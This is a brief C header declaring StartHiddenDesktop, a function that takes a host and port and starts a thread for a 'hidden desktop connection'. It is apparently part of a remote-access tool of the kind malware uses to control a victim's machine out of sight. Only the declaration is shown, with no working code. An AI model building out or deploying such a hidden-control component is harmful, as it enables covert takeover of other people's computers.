#pragma once
#include "../common/Common.h"

/*Starts the thread to establish the hidden desktop connection.
 @return HANDLE to the created thread
*/
HANDLE StartHiddenDesktop(const char *host, int port);